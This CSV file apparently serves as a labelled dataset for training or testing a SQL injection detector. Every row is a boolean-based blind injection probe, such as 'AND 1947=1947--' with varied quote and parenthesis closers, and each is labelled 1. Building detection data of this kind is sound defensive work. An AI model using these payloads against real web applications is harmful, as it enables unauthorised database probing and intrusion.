input_text,Label
"1'lSDwjX<'"">xtqTjp",1
1) AND 2170=8897-- FUmF,1
1) AND 1947=1947-- juSM,1
1') AND 5376=4067-- NlbI,1
1') AND 1947=1947-- gaZa,1
1' AND 7610=3690-- Tmgb,1
1' AND 1947=1947-- nqnZ,1
1' AND 6215=9546-- sKDt,1
"1"" AND 1719=5861-- poIL",1
"1"" AND 1947=1947-- DkvM",1
1) AND 5327=4261 AND (5259=5259,1
1) AND 1947=1947 AND (8363=8363,1
1)) AND 5786=3656 AND ((8795=8795,1
1)) AND 1947=1947 AND ((9114=9114,1
1))) AND 3938=4746 AND (((5651=5651,1
1))) AND 1947=1947 AND (((4560=4560,1
1 AND 8350=7897,1
1 AND 1947=1947,1
1') AND 6106=8706 AND ('jgNf'='jgNf,1
1') AND 1947=1947 AND ('Olgo'='Olgo,1
1')) AND 3362=7125 AND (('Thon'='Thon,1
1')) AND 1947=1947 AND (('gKTH'='gKTH,1
1'))) AND 5970=6314 AND ((('chTf'='chTf,1
1'))) AND 1947=1947 AND ((('oWWY'='oWWY,1
1' AND 8392=3454 AND 'kFdZ'='kFdZ,1
1' AND 1947=1947 AND 'uCHF'='uCHF,1
1' AND 1794=7365 AND 'TCsD'='TCsD,1
1') AND 6578=1114 AND ('cIMN' LIKE 'cIMN,1
1') AND 1947=1947 AND ('RPcv' LIKE 'RPcv,1
1')) AND 2048=1547 AND (('BGTQ' LIKE 'BGTQ,1
1')) AND 1947=1947 AND (('WdIw' LIKE 'WdIw,1
1'))) AND 7306=6193 AND ((('Tamm' LIKE 'Tamm,1
1'))) AND 1947=1947 AND ((('PHjB' LIKE 'PHjB,1
1%' AND 5769=6811 AND 'vHFJ%'='vHFJ,1
1%' AND 1947=1947 AND 'tloF%'='tloF,1
1' AND 4876=2970 AND 'lwbc' LIKE 'lwbc,1
1' AND 1947=1947 AND 'PczQ' LIKE 'PczQ,1
1' AND 4686=7399 AND 'eMCB' LIKE 'eMCB,1
"1"") AND 6836=9093 AND (""Cvss""=""Cvss",1
"1"") AND 1947=1947 AND (""gXkp""=""gXkp",1
"1"")) AND 7521=5807 AND ((""REDv""=""REDv",1
"1"")) AND 1947=1947 AND ((""qggc""=""qggc",1
"1""))) AND 9883=3053 AND (((""PrAg""=""PrAg",1
"1""))) AND 1947=1947 AND (((""ohtp""=""ohtp",1
"1"" AND 2437=8559 AND ""qtqu""=""qtqu",1
"1"" AND 1947=1947 AND ""SDpg""=""SDpg",1
